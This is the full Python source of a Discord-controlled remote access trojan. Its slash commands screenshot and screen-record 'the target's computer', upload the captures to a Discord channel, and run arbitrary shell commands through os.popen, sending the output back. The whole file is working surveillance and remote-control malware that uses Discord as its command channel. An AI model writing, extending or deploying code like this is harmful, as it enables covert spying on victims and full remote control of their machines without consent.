import pyautogui
import time
import ffmpeg
import discord
from discord.ext import commands
import os
import json

# since i am stupid and exposed my bot token, we got this
data = json.load(open("settings.json"))
TOKEN = data["token"]

intents = discord.Intents.all()                         # intents variable for the bots intents
bot = commands.Bot(command_prefix='?', intents=intents) # bot variable holding the bot class
tree = bot.tree                                         # this is for / commands


# this is a temporary asynchronus wait function to not block the main thread. blocking for more then 10 seconds will result in issues
async def wait(duration):
    time.sleep(duration)


# sync app commands
@bot.command(name="sync") 
async def syncCommand(ctx):
    msg = await ctx.send("Syncing...")
    await tree.sync()
    await msg.edit(content="Done!")


# captures a screenshot
@tree.command(name="screenshot", description="Screenshot the contents of the targets computer")
async def screenshotCommand(interaction:discord.Interaction, delay:int=0):
    await interaction.response.defer()          # defers the interaction just in case of delay
    time.sleep(delay)                           # delays the program if provided
    pyautogui.screenshot("image.png")           # captures the screenshot
    file = discord.File("image.png")            # creates a discord file object of the screenshot
    await interaction.followup.send(file=file)  # sends the file
    os.remove("image.png")                      # removes the file from the computer



@tree.command(name="record", description="Records the screen for a set duration and framerate")
async def recordCommand(interaction:discord.Interaction, duration:int=5, frame_rate:int=30):
    await interaction.response.defer()                                        # defer the interaction, we are recording video there will be a delay
    await interaction.channel.send("The recording has" 
                                   f"started and will last for {duration}")   # let the user know we started recording
    (
        ffmpeg.input("desktop",f="gdigrab", s="1920x1080")                    # record the desktop, with windows gdigrab, and resoultion
        .output("output.mp4", r=frame_rate, t=duration,                       # set the output presets, like the framerate, duration, etc
                preset="ultrafast")                                           # thanks to uwufer_gaylord on discord to helping me figure out ffmpeg command LOL (I never used it and didnt understand the flags)
        .run()                                                                # run the process
    ) 
    file = discord.File("output.mp4")                                         # create a file object
    await interaction.followup.send(file=file)                                # send that file
    os.remove("output.mp4")                                                   # claen up our mess



# still under development
@tree.command(name="command", description="Runs a Command Line Interface (CLI) command")
async def commandlineCommand(interaction:discord.Interaction, command:str):
    result = os.popen(command).read()
    if result == "": await interaction.response.send_message("Done!"); return
    await interaction.response.send_message(f"Done! result : `{result}`")


bot.run(TOKEN)